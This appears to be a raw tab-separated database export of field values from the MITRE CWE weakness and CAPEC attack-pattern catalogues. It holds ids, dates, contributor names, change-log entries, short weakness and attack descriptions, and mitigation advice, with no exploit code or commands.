17035	39	2019-01-03
6715	31	1000
21415	35	MITRE
6383	39	2009-10-29
23918	55	CAPEC Content Team
12980	62	updated Observed_Examples
8384	62	Improved the White_Box_Definition
7997	101	CAPEC Content Team
13776	39	2008-07-01
16435	80	Adversaries must be able to register DNS hostnames/URL’s.
7013	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
9885	42	Limit the number of recursive calls to a reasonable number.
17485	62	updated Potential_Mitigations
16388	35	MITRE
11648	69	Incomplete
17841	23	Using realloc() to resize buffers that store sensitive information can leave the sensitive information exposed to attack, because it is not removed from memory.
24892	62	updated Description, Other_Notes
12935	43	Simple
21255	53	The MITRE Corporation
25154	91	Architecture and Design
7430	53	The MITRE Corporation
7425	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12485	35	MITRE
23202	103	Primary
14254	53	The MITRE Corporation
13284	62	updated Common_Consequences
6874	79	Integrity
20479	39	2017-11-08
23590	39	2014-07-30
11859	59	Updated Related_Attack_Patterns
17866	35	MITRE
13118	103	Primary
24693	95	The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.
15882	44	High
12107	31	1000
13065	62	updated Potential_Mitigations
5893	62	updated Relationships
6381	66	Connection pool
20459	40	HTTP TRACE is enabled on the web server
8518	39	2012-05-11
23069	39	2009-10-29
12198	62	updated Relationships, Taxonomy_Mappings
16920	56	ChildOf
5882	79	Authorization
12754	35	Cigital
12918	35	MITRE
8500	21	PLOVER
17145	88	Path Equivalence: 'fakedir/../realdir/filename'
5970	23	An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.
14166	39	2011-06-01
17523	28	CWE Content Team
5843	104	585
15783	56	ChildOf
13768	81	Integrity
9731	103	Primary
14537	28	CWE Content Team
12656	62	updated Relationships
23232	39	2012-05-11
10026	54	High
8194	28	Eric Dalci
13116	53	The MITRE Corporation
7539	62	updated Relationships
10653	101	CAPEC Content Team
15594	35	MITRE
18908	101	CAPEC Content Team
23496	39	2008-09-08
10921	29	1st Edition
8235	44	High
9680	74	2
12006	39	2009-05-27
22275	31	709
22363	103	Primary
24415	62	updated Relationships, Taxonomy_Mappings
12059	28	Eric Dalci
23010	62	updated Common_Consequences
15471	76	2019-04-04
6136	28	CWE Content Team
25023	35	MITRE
10725	31	1000
9052	35	MITRE
18292	66	Secure programming with the OpenSSL API, Part 2: Secure handshake
8329	43	Simple
8710	39	2012-05-11
9638	103	Primary
20387	31	1000
17876	35	MITRE
24725	95	[Target application operates on created symlinks to sensitive files] The attacker is able to create symlinks to sensitive files while the target application is operating on the file.
10269	91	Implementation
21722	81	Integrity
13486	39	2008-09-08
21187	39	2012-05-11
23347	81	Confidentiality
20860	80	Intelligence about the manufacturer's operating environment and infrastructure.
23065	73	Use an automated tool to record all instances of URLs to process XML requests.
23045	62	updated Demonstrative_Examples
16016	31	1000
12546	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
16449	74	3
16652	39	2012-10-30
7885	39	2017-11-08
19430	28	CWE Content Team
10910	39	2011-09-13
21818	31	699
12092	28	CWE Content Team
11041	88	finalize() Method Without super.finalize()
12636	50	Leverage stateful firewalls that allow for the rejection of a packet that is not part of an existing connection.
14707	39	2008-11-24
7734	35	MITRE
10715	50	Utilize strict type, character, and encoding enforcement
13209	59	Updated Related_Attack_Patterns
23675	39	2008-10-14
6878	92	Explore
20710	28	CWE Content Team
21238	78	Medium
18389	62	updated Relationships
21117	39	2009-03-10
22915	28	CWE Content Team
18833	51	2014-06-23
11987	23	The software creates a temporary file in a directory whose permissions allow unintended actors to determine the file's existence or otherwise access that file.
19017	31	1000
23735	21	CWE Content Team
15040	62	updated Common_Consequences, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
13144	73	Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded.
17729	76	2015-11-09
12987	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
16599	39	2010-02-16
23037	46	A variety of Halstead complexity measures exist, such as program vocabulary size or volume. This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
17726	102	CanFollow
12093	35	MITRE
18715	63	Execute Unauthorized Code or Commands
25136	26	Operation
11175	62	updated Common_Consequences
24273	39	2011-06-01
23938	45	Base
17762	39	2018-03-27
16547	101	CAPEC Content Team
23489	48	02
10806	63	Modify Files or Directories
22238	62	updated Potential_Mitigations, References
23462	62	updated Relationships
11430	56	StartsWith
17107	78	Low
18507	78	High
13535	100	The MITRE Corporation
8761	39	2017-01-19
12818	70	FIO30-C. Exclude user input from format strings
9650	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13865	31	1000
13160	39	2014-07-30
11848	26	Architecture and Design
12206	97	Communication Channel Manipulation
11516	28	CWE Content Team
10468	102	ChildOf
14156	73	The attacker loads the session ID into his network communications and impersonates a legitimate user to gain access to data or functionality.
6073	28	CWE Content Team
16900	81	Integrity
14214	50	Pick a robust implementation of an XML parser.
13164	97	Data Injected During Configuration
24671	39	2012-05-11
22682	63	Modify Files or Directories
8002	95	Consider parts of the program where user supplied data may be expanded by the program. Use a disassembler and other reverse engineering tools to guide the search.
14047	28	CWE Content Team
6746	81	Access Control
20844	23	The product has a method that is declared public, but returns a reference to a private data structure, which could then be modified in unexpected ways.
13907	70	Practical Padding Oracle Attacks
14323	49	1998
12775	28	CWE Content Team
13411	62	updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships
5677	28	CWE Content Team
11388	62	updated Related_Attack_Patterns
6513	43	Simple
25441	100	The MITRE Corporation
16510	28	CWE Content Team
15039	35	MITRE
9677	28	CWE Content Team
16377	45	Base
6775	94	Intercept and control Wi-Fi data communications to/from mobile device.
11117	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships, Taxonomy_Mappings
11853	39	2017-11-08
14615	59	Updated Related_Attack_Patterns
21124	78	Low
24015	35	MITRE
11535	63	Read Application Data
23702	39	2008-07-01
20411	27	The relevant sensors and tools to detect and analyze fault/side-channel data from a system.                A tool capable of injecting fault/side-channel data into a system or application.
22339	27	For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.
8926	33	U.S. Department of Commerce
17660	101	CAPEC Content Team
12326	35	MITRE
23800	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
20812	28	CWE Content Team
10702	80	Advanced knowledge of the design of the system.
7268	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.
7560	91	Architecture and Design
20414	28	CWE Content Team
14941	28	CWE Content Team
21432	47	Execute Unauthorized Commands
7231	69	Incomplete
22506	71	2004
11002	28	CWE Content Team
12179	56	ChildOf
6353	55	CAPEC Content Team
12637	23	An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple "files" to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.
19549	26	Implementation
9143	31	699
20527	28	CWE Content Team
23180	35	MITRE
22671	28	CWE Content Team
23687	26	Architecture and Design
9069	39	2012-05-11
9002	35	MITRE
15558	100	The MITRE Corporation
7841	39	2009-12-28
11491	35	MITRE
17904	35	MITRE
8444	39	2019-01-03
13485	31	1000
23300	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
23528	45	Class
6810	62	updated Relationships, Taxonomy_Mappings
23036	59	Updated Attack_Motivation-Consequences
24389	58	An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.
13686	35	Cigital
16880	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
21578	103	Primary
13789	28	CWE Content Team
16653	35	MITRE
16431	45	Class
8774	33	Michael Gegick
8345	40	Advanced knowledge of hardware capabilities of a manufacturer's product.
24615	62	updated Taxonomy_Mappings
21294	42	If performance constraints permit, special code can be added that validates null-termination of string buffers, this is a rather naive and error-prone solution.
14369	35	MITRE
14690	39	2014-07-30
23276	28	CWE Content Team
20037	28	CWE Content Team
20488	101	CAPEC Content Team
5727	31	1000
16622	35	MITRE
9245	62	updated Relationships
7542	97	ASIC With Malicious Functionality
24110	28	CWE Content Team
19818	40	The targeted server either fails to verify that data in SOAP messages conforms to the appropriate XML schema, or it fails to correctly handle the complete range of data allowed by the schema.
15392	91	Architecture and Design
19950	86	http://www.openwall.com/presentations/PHDays2012-Password-Security/
7879	35	MITRE
23180	28	CWE Content Team
12178	28	CWE Content Team
13625	56	ChildOf
23432	73	Leverage cross-site scripting vulnerability to inject payload.
14526	39	2012-10-30
12408	63	Bypass Protection Mechanism
6279	48	07
18143	90	Language-Independent
7538	39	2011-03-29
15020	62	updated Demonstrative_Examples, References, Relationships
7390	33	Stefan Mangard
13488	62	updated Applicable_Platforms
22635	62	updated Applicable_Platforms, References
21723	25	Low
16311	80	The attacker has to have detailed knowledge of the HTTP protocol specifics and must also possess exact details on the discrepancies between the two targeted entities in parsing HTTP requests.
18415	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Name, Other_Notes, Potential_Mitigations, Relationships
16635	62	updated Relationships, Taxonomy_Mappings
16069	62	updated Relationships
15389	39	2008-09-08
16970	79	Integrity
11956	104	670
8218	104	908
10210	35	MITRE
7268	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
22349	76	2017-05-01
19907	39	2008-09-08
8785	24	MITRE
9546	24	MITRE
18869	39	2014-02-18
15379	89	Detailed
13717	55	CAPEC Content Team
7631	72	In some cases, integer coercion errors can lead to exploitable buffer overflow conditions, resulting in the execution of arbitrary code.
7220	35	MITRE
17326	43	Simple
22699	35	MITRE
22017	63	Read Memory
6914	28	CWE Content Team
8420	47	Gain Privileges
7479	63	Modify Files or Directories
10524	73	Send emails with specifically-constructed, metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.
24879	50	Upgrade the SIM card to use the state-of-the-art AES or the somewhat outdated 3DES algorithm for OTA.
24911	45	Base
12256	39	2011-06-01
19390	39	2008-09-08
17912	62	updated References, Relationships
7380	62	updated Relationships
16151	27	None: No specialized resources are required to execute this type of attack. Web service digging tools may be helpful.
6434	100	The MITRE Corporation
11168	21	Anonymous Tool Vendor (under NDA)
14277	35	Cigital
20935	51	2015-11-09
15621	47	Resource Consumption
24290	31	1000
14692	62	updated Demonstrative_Examples, References, Relationships
20621	28	Eric Dalci
24951	62	updated Other_Notes
5873	28	CWE Content Team
13603	56	ChildOf
16925	31	1000
19355	62	updated Detection_Factors
22280	62	updated Background_Details, Description
9941	63	Read Application Data
18135	100	The MITRE Corporation
6220	28	CWE Content Team
15844	104	183
9608	62	updated Relationships, Other_Notes
9423	81	Confidentiality
25240	51	2014-06-23
8962	47	Modify Data
7812	39	2008-09-08
7738	95	[Survey application] The attacker first takes an inventory of the functionality exposed by the application.
14241	76	2017-08-04
20523	23	The application stores sensitive information in cleartext in an executable.
18328	28	CWE Content Team
11678	28	CWE Content Team
22561	35	MITRE
9523	27	Ability to communicate synchronously or asynchronously with server
23975	62	updated Alternate_Terms, Common_Consequences, Description, Relationships, Other_Notes, Weakness_Ordinalities
14380	103	Primary
13744	74	2
9621	35	MITRE
23970	69	Incomplete
19570	62	updated Potential_Mitigations, Time_of_Introduction
9209	45	Base
23840	79	Authorization
13451	62	updated Demonstrative_Examples
8914	100	The MITRE Corporation
20446	62	updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
12354	81	Confidentiality
16047	42	Always use explicit block delimitation and use static-analysis technologies to enforce this practice.
17748	39	2019-06-20
18385	56	ChildOf
14758	81	Integrity
25123	40	The target application must utilize some sort of filtering mechanism (input, output, or data masking).
11719	31	1000
25148	28	CWE Content Team
20557	59	Updated Resources_Required
9633	60	25
10189	76	2019-04-04
13424	91	Implementation
5811	35	MITRE
10412	35	MITRE
8719	77	Manual Static Analysis - Binary or Bytecode
14439	31	699
22635	39	2017-11-08
21056	21	Anonymous Tool Vendor (under NDA)
13087	62	updated Related_Attack_Patterns
10612	44	High
15292	28	CWE Content Team
6897	39	2019-01-03
12080	62	added/updated demonstrative examples
14621	39	2010-06-21
12039	39	2013-07-17
9338	28	CWE Content Team
22871	39	2011-06-27
13948	54	Low
8698	39	2019-09-19
21092	78	Low
10544	24	MITRE
18124	23	An attacker uses techniques and methods to bypass physical security measures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.
17482	66	Cross Site Port Attacks - XSPA - Part 2
24326	44	SOAR Partial
17126	28	CWE Content Team
8764	55	CAPEC Content Team
23717	50	Design: Ensure all input is validated, and does not contain file system commands
6972	39	2012-10-30
16082	28	CWE Content Team
10171	103	Primary
20059	95	[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.
15213	44	SOAR Partial
11151	104	52
5629	45	Variant
12551	104	59
16995	31	699
20569	78	Medium
14335	77	Black Box
6322	45	Variant
17440	97	Artificially Inflate File Sizes
18617	61	Draft
12185	89	Detailed
24676	81	Access Control
15699	89	Detailed
11881	95	[Leverage ability to bypass input validation] Attacker leverages his ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.
5790	47	Execute Unauthorized Commands
21618	99	Microsoft
16193	28	CWE Content Team
5990	103	Primary
15122	79	Integrity
16028	62	updated Potential_Mitigations, Time_of_Introduction
16480	101	CAPEC Content Team
20734	77	Manual Static Analysis - Binary or Bytecode
9736	31	1000
21859	69	Incomplete
18887	90	Language-Independent
18857	35	MITRE
7715	39	2010-02-16
8559	62	updated Applicable_Platforms
6697	90	C++
12964	62	updated Relationships
12451	25	Medium
23663	62	updated Relationships
9760	28	CWE Content Team
20314	31	1000
19516	76	2018-07-31
16528	61	Draft
22457	21	PLOVER
9208	35	MITRE
10808	35	MITRE
11279	103	Primary
23195	35	MITRE
8324	62	updated Common_Consequences
12909	91	Requirements
22094	45	Class
21692	61	Draft
6949	76	2019-04-04
24336	35	MITRE
6653	39	2011-06-27
21828	62	updated Relationships, Taxonomy_Mappings
12986	55	CAPEC Content Team
23656	71	2008
21987	31	699
25326	35	MITRE
22755	35	MITRE
8146	28	CWE Content Team
22515	62	updated Demonstrative_Examples
15007	33	Johannes Ullrich
18724	26	Implementation
9433	35	MITRE
17131	26	Implementation
24443	51	2014-06-23
6907	39	2008-10-14
23176	35	MITRE
22556	62	updated Name
25223	62	updated Relationships
15910	21	PLOVER
11973	91	Installation
22126	31	1000
9783	79	Availability
15559	92	Exploit
10676	39	2012-10-30
12184	27	Evercookie source code
22724	39	2011-06-01
14020	21	PLOVER
10726	39	2019-06-20
16628	35	MITRE
17598	39	2019-01-03
11603	78	High
24593	21	7 Pernicious Kingdoms
23664	72	Data may be disclosed to an entity impersonating a trusted entity, resulting in information disclosure.
17740	92	Exploit
5647	62	updated Potential_Mitigations
6938	94	Run Arbitrary Code
15550	39	2012-05-11
7092	35	MITRE
9297	23	The code calls sizeof() on a malloced pointer type, which always returns the wordsize/8. This can produce an unexpected result if the programmer intended to determine how much memory has been allocated.
25199	25	Low
11166	39	2012-10-30
21876	28	CWE Content Team
17800	56	ChildOf
10030	62	Suggested OWASP Top Ten 2004 mapping
17407	57	Primary
12220	92	Exploit
10011	67	Low
15306	81	Confidentiality
17236	26	Implementation
21226	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
23497	35	MITRE
16239	103	Primary
18619	62	updated Related_Attack_Patterns
23542	62	updated Relationships
6502	74	1
5964	53	The MITRE Corporation
17090	31	1003
6897	62	updated Weakness_Ordinalities
6769	31	699
20096	23	An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.
22434	81	Other
22469	43	Simple
23374	26	Operation
6127	35	MITRE
12016	28	CWE Content Team
8545	103	Primary
20625	62	updated Time_of_Introduction
6478	86	http://guides.rubyonrails.org/security.html#mass-assignment
22829	81	Integrity
20100	90	Language-Independent
17459	72	Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
14795	39	2011-06-01
10692	59	Updated Related_Attack_Patterns
15960	35	MITRE
24864	62	updated Name, Taxonomy_Mappings
24566	35	MITRE
11454	35	MITRE
14078	42	After distribution, you can set the kill bit for the control so that it is not accessible from Internet Explorer.
15479	62	updated Relationships, Taxonomy_Mappings
25363	47	Gain Privileges
21797	62	updated Description, Name
12941	23	An adversary uses framing techniques to contextualize a conversation so that the target is more likely to be influenced by the adversary's point of view. Framing is information and experiences in life that alter the way we react to decisions we must make. This type of persuasive technique exploits the way people are conditioned to perceive data and its significance, while avoiding negative or avoidance responses from the target. Rather than a specific technique framing is a methodology of conversation that slowly encourages the target to adopt to the adversary's perspective. One technique of framing is to avoid the use of the word "No" and to contextualize responses in a manner that is positive. When performed skillfully the target is much more likely to volunteer information or perform actions favorable to the adversary.
21996	70	Advanced SQL Injection to Operating System Full Control
24272	42	In some cases, input validation may be an important strategy when output encoding is not a complete solution. For example, you may be providing the same output that will be processed by multiple consumers that use different encodings or representations. In other cases, you may be required to allow user-supplied input to contain control information, such as limited HTML tags that support formatting in a wiki or bulletin board. When this type of requirement must be met, use an extremely strict whitelist to limit which control sequences can be used. Verify that the resulting syntactic structure is what you expect. Use your normal encoding methods for the remainder of the input.
24885	35	MITRE
12920	90	C++
13223	24	MITRE
10705	39	2009-10-29
13105	35	MITRE
18478	26	Implementation
22615	79	Confidentiality
11996	46	If an attacker can cause the UI to display erroneous data, or to otherwise convince the user to display information that appears to come from a trusted source, then the attacker could trick the user into performing the wrong action. This is often a component in phishing attacks, but other kinds of problems exist. For example, if the UI is used to monitor the security state of a system or network, then omitting or obscuring an important indicator could prevent the user from detecting and reacting to a security-critical event.             UI misrepresentation can take many forms:                                                Incorrect indicator: incorrect information is displayed, which prevents the user from understanding the true state of the software or the environment the software is monitoring, especially of potentially-dangerous conditions or operations. This can be broken down into several different subtypes.                   Overlay: an area of the display is intended to give critical information, but another process can modify the display by overlaying another element on top of it. The user is not interacting with the expected portion of the user interface. This is the problem that enables clickjacking attacks, although many other types of attacks exist that involve overlay.                   Icon manipulation: the wrong icon, or the wrong color indicator, can be influenced (such as making a dangerous .EXE executable look like a harmless .GIF)                   Timing: the software is performing a state transition or context switch that is presented to the user with an indicator, but a race condition can cause the wrong indicator to be used before the product has fully switched context. The race window could be extended indefinitely if the attacker can trigger an error.                   Visual truncation: important information could be truncated from the display, such as a long filename with a dangerous extension that is not displayed in the GUI because the malicious portion is truncated. The use of excessive whitespace can also cause truncation, or place the potentially-dangerous indicator outside of the user's field of view (e.g. "filename.txt .exe"). A different type of truncation can occur when a portion of the information is removed due to reasons other than length, such as the accidental insertion of an end-of-input marker in the middle of an input, such as a NUL byte in a C-style string.                   Visual distinction: visual information might be presented in a way that makes it difficult for the user to quickly and correctly distinguish between critical and unimportant segments of the display.                   Homographs: letters from different character sets, fonts, or languages can appear very similar (i.e. may be visually equivalent) in a way that causes the human user to misread the text (for example, to conduct phishing attacks to trick a user into visiting a malicious web site with a visually-similar name as a trusted site). This can be regarded as a type of visual distinction issue.
14675	40	The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.
10860	35	Cigital
8376	63	Alter Execution Logic
14893	57	Primary
12799	26	Implementation
13051	36	http://www.w3.org/TR/2000/NOTE-SOAP-20000508/#_Toc478383522
21223	35	MITRE
10351	35	MITRE
5818	103	Primary
14747	47	Other
11606	39	2012-05-11
19520	76	2015-11-09
7983	35	MITRE
14823	23	The software contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.
12427	26	Architecture and Design
23183	69	Incomplete
20220	95	[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the BitSquatted URL.
7613	102	ChildOf
24690	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19638	62	updated Observed_Examples, Taxonomy_Mappings
21010	39	2012-10-30
23382	39	2009-01-12
16398	45	Variant
10505	81	Confidentiality
17828	63	Read Memory
15240	35	MITRE
11121	51	2015-11-09
8119	76	2015-12-07
22900	45	Base
11069	62	updated Alternate_Terms, Maintenance_Notes, Other_Notes, Relationships
24851	62	added/updated demonstrative examples
21346	39	2008-07-01
19589	35	MITRE
14444	103	Primary
23788	62	updated Related_Attack_Patterns
8556	39	2012-10-30
7895	39	2011-06-01
22089	72	Sensitive data may be exposed to an unauthorized actor in another control sphere. This may have a wide range of secondary consequences which will depend on what data is exposed. One possibility is the exposure of system data allowing an attacker to craft a specific, more effective attack.
10056	91	Requirements
22493	62	updated Relationships, Taxonomy_Mappings
8193	35	MITRE
17449	62	updated Common_Consequences, References
20149	35	MITRE
10749	81	Other
6622	62	updated Potential_Mitigations
21605	59	Updated Attacker_Skills_or_Knowledge_Required, References
5735	62	updated Related_Attack_Patterns
16228	30	Ronen
11162	35	MITRE
21716	61	Stable
21504	39	2012-05-11
19677	42	When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.
22112	89	Detailed
19528	76	2019-04-04
6724	28	CWE Content Team
12415	35	MITRE
16619	85	392
15590	101	CAPEC Content Team
24727	28	CWE Content Team
20654	21	PLOVER
21435	101	CAPEC Content Team
18318	62	updated Common_Consequences, Other_Notes
18672	91	Implementation
9519	101	CAPEC Content Team
12999	56	ChildOf
24484	62	updated Applicable_Platforms, Demonstrative_Examples
19606	35	MITRE
19383	62	updated Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings, Type
12821	39	2011-06-27
15680	28	CWE Content Team
21130	62	updated Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings
23042	61	Draft
24228	24	MITRE
7209	100	The MITRE Corporation
20341	28	CWE Content Team
9335	28	CWE Content Team
8553	79	Availability
14325	23	The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.
20549	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
11471	35	MITRE
12978	54	Medium
7051	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Context-configured Source Code Weakness Analyzer
21605	100	The MITRE Corporation
15019	62	updated Potential_Mitigations
15149	62	updated Taxonomy_Mappings
14675	23	An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.
19355	39	2014-07-30
10298	35	MITRE
6243	62	updated Potential_Mitigations
10124	86	http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
21934	79	Integrity
8788	25	Low
6971	39	2010-02-16
16836	31	1000
23468	39	2011-06-01
13249	31	1000
6952	69	Incomplete
15667	28	CWE Content Team
14867	26	Implementation
20412	54	High
9508	45	Class
8694	39	2019-06-20
14144	28	CWE Content Team
18381	91	Implementation
13239	26	Architecture and Design
15027	78	High
17374	33	Jim Manico
19603	62	updated Potential_Mitigations
22335	28	CWE Content Team
24749	35	MITRE
23355	28	CWE Content Team
23084	62	updated Related_Attack_Patterns
19023	35	MITRE
17187	28	CWE Content Team
20024	39	2008-11-24
24776	62	updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings, White_Box_Definitions
23091	90	Language-Independent
10272	35	MITRE
5915	90	Language-Independent
24298	39	2009-07-27
13744	92	Explore
17306	35	MITRE
12492	31	699
6894	62	updated Common_Consequences
11198	28	CWE Content Team
9409	35	MITRE
15185	62	updated Demonstrative_Examples, Relationships
10956	28	CWE Content Team
6629	62	updated Relationships, Taxonomy_Mappings
14247	95	[Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.
22042	31	1000
7781	91	Implementation
6150	31	699
7395	47	Unreliable Execution
9888	43	Simple
12148	40	The schema used by the target application must be improperly secured against unauthorized modification and manipulation.
14175	89	Standard
19062	59	Updated References
19123	54	High
17892	62	updated Relationships, Taxonomy_Mappings
11128	35	MITRE
11014	80	Social engineering and more sophisticated technical attacks.
13968	35	MITRE
12570	62	updated Potential_Mitigations
7504	62	updated Common_Consequences
20394	90	Language-Independent
20392	39	2008-10-14
6872	90	Language-Independent
23674	100	The MITRE Corporation
13490	51	2014-06-23
15359	31	1000
21998	74	2
7841	35	MITRE
12180	62	updated Common_Consequences, Demonstrative_Examples, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships
9006	45	Base
17525	73	Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.
20939	85	220
8764	51	2014-06-23
11670	72	If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.
18001	40	The adversary requires the ability to craft custom UDP Packets for use during network reconnaissance.
24142	53	The MITRE Corporation
17826	95	The attacker creates or modifies a symbolic link pointing to a resources (e.g., file, directory). The content of the symbolic link file includes out-of-bounds (e.g. excessive length) data.
7590	103	Primary
17116	28	CWE Content Team
16806	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
7797	62	updated Relationships
19834	35	MITRE
7749	88	Incomplete Filtering of Multiple Instances of Special Elements
11886	85	175
17728	43	Simple
23545	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
8588	62	updated Description, Relationships
14024	35	MITRE
21522	91	Architecture and Design
21171	62	updated Relationships
8415	35	Cigital
23810	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Time_of_Introduction
23906	45	Variant
7527	81	Confidentiality
8225	63	Bypass Protection Mechanism
21979	49	2008
21094	35	MITRE
22556	35	MITRE
24348	62	updated Potential_Mitigations, Time_of_Introduction
10553	39	2011-06-01
13620	35	MITRE
9508	104	691
18032	73	List parameters, external variables, configuration files variables, etc. that are possibly used by the application.
19522	66	Defying Logic: Theory, Design, and Implementation of Complex Systems for Testing Application Logic
16521	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
10935	35	MITRE
14088	42	Often one can artificially manipulate the time which operations take or -- when operations occur -- can remove information from the attacker.
14792	100	The MITRE Corporation
12860	28	CWE Content Team
8927	30	Jouko Pynnonen
11847	62	updated Demonstrative_Examples, Potential_Mitigations
10601	31	1000
15052	78	Low
14974	33	Michael Gegick
7458	28	CWE Content Team
10257	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
19854	28	CWE Content Team
14203	62	updated Related_Attack_Patterns, Relationships
15817	62	updated Time_of_Introduction
12328	43	Simple
23066	54	Low
14311	76	2019-04-04
7903	28	CWE Content Team
18273	62	updated Observed_Examples, Related_Attack_Patterns, Relationships
25168	26	Implementation
11422	28	CWE Content Team
12505	35	MITRE
18514	28	CWE Content Team
9263	55	CAPEC Content Team
22447	23	The software uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.
10656	39	2013-02-21
18030	35	MITRE
11297	42	Do not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution.
